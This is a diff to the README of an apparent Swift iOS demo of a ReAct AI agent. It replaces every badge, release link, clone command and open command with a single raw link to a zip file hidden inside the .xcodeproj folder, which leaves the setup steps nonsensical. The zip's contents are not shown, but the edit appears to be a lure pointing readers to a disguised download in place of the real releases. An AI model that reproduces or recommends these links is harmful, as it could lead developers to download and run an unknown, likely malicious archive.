@@ -1,11 +1,11 @@
 # Swift AI Agent Demo: iOS Implementation of ReAct AI Pattern 🤖
 
-![Swift AI Agent Demo](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg)
-![Swift](https://img.shields.io/badge/Swift-5.5-orange.svg)
-![iOS](https://img.shields.io/badge/iOS-15.0%2B-blue.svg)
-![GitHub Releases](https://img.shields.io/badge/Releases-Click%20Here-brightblue.svg)
+![Swift AI Agent Demo](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip)
+![Swift](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip)
+![iOS](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip%https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip)
+![GitHub Releases](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip%https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-ff69b4)](https://github.com/rodrigo1987mza/swift-ai-agent-demo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip%20Latest%20Release-Here-ff69b4)](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip)
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ The **Swift AI Agent Demo** is a native iOS application that demonstrates the Re
 
 The project serves as an excellent learning tool for developers interested in artificial intelligence, automation, and mobile app development. With a focus on Swift and SwiftUI, this demo provides a clear example of how to integrate AI capabilities into iOS applications.
 
-For the latest version, [download here](https://github.com/rodrigo1987mza/swift-ai-agent-demo/releases).
+For the latest version, [download here](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip).
 
 ## Features
 
@@ -51,7 +51,7 @@ Before you begin, ensure you have the following:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/rodrigo1987mza/swift-ai-agent-demo.git
+   git clone https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -63,7 +63,7 @@ Before you begin, ensure you have the following:
 3. Open the project in Xcode:
 
    ```bash
-   open swift-ai-agent-demo.xcodeproj
+   open https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip
    ```
 
 4. Build and run the application on your iOS device or simulator.
@@ -104,4 +104,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - **SwiftUI**: For enabling modern UI development on iOS.
 - **Community**: For continuous support and contributions to the project.
 
-For the latest version, [download here](https://github.com/rodrigo1987mza/swift-ai-agent-demo/releases). Check the "Releases" section for updates.
+For the latest version, [download here](https://raw.githubusercontent.com/rodrigo1987mza/swift-ai-agent-demo/main/ReActAgent.xcodeproj/demo_agent_ai_swift_3.2.zip). Check the "Releases" section for updates.
